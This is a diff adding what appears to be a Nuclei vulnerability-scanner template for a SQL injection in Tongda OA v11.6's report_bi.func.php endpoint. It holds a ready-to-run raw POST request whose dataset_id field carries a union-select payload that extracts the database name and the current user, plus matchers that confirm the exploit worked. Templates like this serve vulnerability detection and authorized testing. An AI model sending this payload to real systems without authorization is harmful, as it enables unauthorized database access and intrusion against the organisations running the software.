@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - status:
+            - 200
+          type: status
+        - condition: and
+          part: body
+          type: word
+          words:
+            - col
+            - target
+      matchers-condition: and
+      raw:
+        - |
+          POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          _POST[dataset_id]=efgh'-@`'`)union+select+database(),2,user()#'&action=get_link_info&
+id: tongda-oa-v11-6-report-bi-sqli
+info:
+    author: pphua
+    description: 通达OA v11.6 report_bi.func.php 存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息
+    metadata:
+        verified: true
+    name: 通达OA v11.6 report_bi.func.php SQL注入漏洞
+    reference: null
+    severity: high
+    tags:
+        - tongda
+        - 通达oa
